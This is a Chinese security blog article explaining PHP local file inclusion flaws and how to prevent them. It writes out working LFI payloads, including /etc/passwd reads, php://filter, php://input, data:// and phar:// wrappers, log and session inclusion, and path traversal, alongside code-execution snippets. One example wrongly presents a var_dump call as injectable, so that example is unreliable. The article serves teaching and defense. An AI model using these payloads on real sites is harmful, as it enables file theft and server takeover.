#  一行代码引发的灾难：PHP文件包含漏洞全面剖析与防御   
原创 VlangCN  HW安全之路   2025-04-08 20:21  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Bvow4Cv9oZ3eTrDwp7Jvu3HrLl577luB3N20eQv69BlgDY1wRI95fZaWicCXUSy9h0KWGPnkUgN7Jz0sGiaHOF2g/640?wx_fmt=gif&from=appmsg "")  
  
  
在Web安全领域，文件包含漏洞(File Inclusion)是一种常见但危害严重的安全缺陷。今天我们深入浅出地讲解本地文件包含漏洞(LFI)的原理、利用方式和防御措施，帮助开发者构建更安全的应用程序。  
## 什么是LFI漏洞？  
  
LFI(Local File Inclusion)，即本地文件包含漏洞，是指攻击者能够利用应用程序的文件包含功能，使服务器执行或泄露本地文件内容的一种安全漏洞。它可能导致敏感信息泄露、代码执行甚至服务器完全沦陷。  
  
不同于RFI(远程文件包含)需要从外部服务器加载恶意文件，LFI主要针对目标服务器上已有的文件进行操作，这也使得它在安全限制更严格的环境中仍然具有威胁性。  
## 漏洞形成原因  
  
LFI漏洞主要出现在使用动态文件包含功能的Web应用中，尤其是PHP应用。当应用代码允许用户控制要包含的文件路径，又没有进行足够的安全检查时，就会产生漏洞。  
  
PHP中最常见的文件包含函数有四种：  
- require()  
  
- require_once()  
  
- include()  
  
- include_once()  
  
这些函数的区别在于：  
- include()  
 出现错误时仅产生警告，程序继续执行  
  
- require()  
 出现错误时直接终止程序  
  
- 带有_once  
后缀的函数确保同一文件只被包含一次，避免重复定义问题  
  
最典型的漏洞代码示例：  
```
<?php include($_GET['file']); ?>

```  
  
这行看似简单的代码可能带来灾难性后果——攻击者可以通过控制file  
参数来包含并执行服务器上的任意文件。  
## LFI漏洞的危害  
  
文件包含漏洞可能造成以下危害：  
1. **敏感信息泄露**  
：读取系统配置文件、数据库凭证等  
  
1. **代码执行**  
：结合其他技术执行恶意代码  
  
1. **权限提升**  
：结合其他漏洞获取更高权限  
  
1. **完全控制**  
：在某些情况下获得服务器的完全控制权  
  
在CTF比赛和实际渗透测试中，LFI是常见的切入点，往往可以配合其他技术扩大攻击面。  
## LFI利用技术详解  
### 1. 基本利用  
  
最简单的LFI利用是直接包含系统文件：  
```
http://vulnerable-site.com/page.php?file=/etc/passwd

```  
### 2. PHP伪协议利用  
  
PHP提供了多种伪协议，可以在文件包含漏洞中发挥强大作用：  
### php://filter  
  
php://filter  
是一种元封装器，用于"数据流打开"时的"筛选过滤"。它可以在不直接执行PHP代码的情况下读取源代码文件：  
```
http://vulnerable-site.com/page.php?file=php://filter/convert.base64-encode/resource=config.php

```  
  
这个请求会返回config.php  
文件的Base64编码内容，攻击者可以解码后查看源代码，而不会执行文件中的PHP代码。这对于获取敏感配置信息、寻找更多漏洞入口点非常有用。  
### php://input  
  
如果服务器配置允许，php://input  
可用于执行POST请求中的PHP代码：  
```
http://vulnerable-site.com/page.php?file=php://input

```  
  
攻击者通过POST请求传入PHP代码：  
```
<?php phpinfo(); ?>

```  
  
服务器会执行这段代码，显示PHP配置信息。更危险的是，攻击者可以传入一句话木马等恶意代码。  
### data://伪协议  
  
data://  
数据流封装器允许直接在URL中包含数据：  
```
http://vulnerable-site.com/page.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B

```  
  
上面URL中的Base64编码内容解码后是<?php phpinfo();?>  
。  
### 3. phar://伪协议  
  
phar://  
是PHP 5.3.0引入的压缩包包装器，可以访问PHP归档文件内的内容：  
```
http://vulnerable-site.com/page.php?file=phar://uploaded_file.jpg/malicious_script.php

```  
  
这种技术允许攻击者绕过文件扩展名限制，上传看似无害的图片文件，实际包含恶意PHP代码。  
### 4. 包含日志文件  
  
Apache、Nginx等Web服务器通常会记录访问日志。攻击者可以先在User-Agent等HTTP头中注入PHP代码，然后包含日志文件执行：  
```
http://vulnerable-site.com/page.php?file=/var/log/apache2/access.log

```  
  
这种技术利用了服务器会记录HTTP请求信息到日志的特性，将恶意代码植入日志后通过LFI执行。  
### 5. 包含会话文件  
  
PHP默认将会话文件存储在/tmp  
目录下。如果攻击者能控制会话内容并知道会话ID，可以包含并执行会话文件：  
```
http://vulnerable-site.com/page.php?file=/tmp/sess_SESSIONID

```  
## 实战案例分析  
### 案例1：基础LFI漏洞  
  
考虑以下代码：  
```
<?php
$file = $_GET['page'] . '.php';
include($file);
?>

```  
  
这段代码看似安全（强制添加了.php后缀），但攻击者可以使用/../  
路径遍历或空字节注入绕过限制：  
```
http://vulnerable-site.com/index.php?page=../../../etc/passwd%00

```  
>   
> 注：空字节注入(%00)技术在PHP 5.3.4之后已被修复，但在旧系统中仍可能存在。  
  
### 案例2：命令执行与代码注入  
  
以下代码存在文件包含漏洞和命令执行漏洞：  
```
<?php
$hello = $_GET['hello'];
var_dump($hello);
?>

```  
  
攻击者可以构造如下Payload：  
```
http://vulnerable-site.com/?hello=);echo `cat flag.php`;//

```  
  
这里利用了参数注入关闭前面的代码结构);  
，执行系统命令echo  
cat flag.php``，然后用//  
注释掉后面的代码。  
### 案例3：利用PHP协议执行代码  
  
对于限制了文件路径的场景，可以使用PHP协议绕过：  
```
http://vulnerable-site.com/index.php?path=php://input

```  
  
然后通过POST数据传入PHP代码：  
```
<?php system('ls -la'); ?>

```  
## 漏洞防御策略  
  
防御LFI漏洞需要多层次的安全措施：  
### 1. 输入验证与过滤  
- 使用白名单限制包含的文件  
  
- 移除或转义路径遍历字符（如../  
）  
  
- 验证文件扩展名和MIME类型  
  
代码示例：  
```
// 白名单验证
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];

if(in_array($page, $allowed_pages)) {
    include $page . '.php';
} else {
    include 'default.php';
}

```  
### 2. 禁用危险功能  
  
在php.ini  
中设置：  
- allow_url_include = Off  
：禁止包含远程文件  
  
- open_basedir  
：限制PHP可访问的目录  
  
- 禁用不必要的PHP伪协议  
  
### 3. 文件命名和权限管理  
- 使用随机或难以猜测的文件名  
  
- 合理设置文件系统权限  
  
- 将敏感文件放在Web根目录外  
  
### 4. 使用安全的代码结构  
- 避免直接使用用户输入作为文件路径  
  
- 使用抽象层或框架提供的安全包含方法  
  
- 实现适当的错误处理机制  
  
```
// 更安全的文件包含
function safe_include($filename) {
    // 规范化路径
    $real_path = realpath($filename);

    // 验证路径是否在允许的目录中
    $allowed_dir = realpath('/var/www/includes/');
    if(strpos($real_path, $allowed_dir) === 0 && file_exists($real_path)) {
        include $real_path;
        return true;
    }
    return false;
}

```  
### 5. 部署WAF和运行时保护  
- 使用Web应用防火墙(WAF)拦截可疑请求  
  
- 实施运行时应用自我保护(RASP)技术  
  
- 定期进行安全审计和渗透测试  
  
## 总结  
  
本地文件包含(LFI)漏洞虽然概念简单，但利用方式多样且危害严重。它不仅可能导致敏感信息泄露，还可能通过多种途径实现代码执行。作为开发者，应该始终保持安全意识，实施合理的输入验证和过滤机制，并遵循最小权限原则。  
  
在应用设计阶段就考虑安全因素，使用成熟的框架和库，定期进行安全测试，才能有效降低LFI等漏洞的风险。  
  
**Web安全是一个持续进行的过程，而不是一次性的任务。**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Bvow4Cv9oZ0BfboLjHF8RcNM8wdoZl2hbZBZVwoRZaNYrgwKDmnUsdnHhEkK6c2iaxGpD0D7llpeM09WEQHyAqA/640?wx_fmt=gif&from=appmsg "")  
  
**5步发现，3招防御：解密被安全圈忽视的致命漏洞CSPT**  
  
**网站篡改入门,一个SQL注入漏洞就能让整个网站大变样，原理详解|!|从SQL注入到XSS攻击，完整还原黑客是如何篡改网站的**  
  
**从文件上传到XSS：一次看似无害的漏洞奇案**  
  
**关注我们的公众号，并给本文点赞，点个推荐支持一下吧！您的每一个小红心，都是我坚持创作优质内容的最大动力**  
  
  
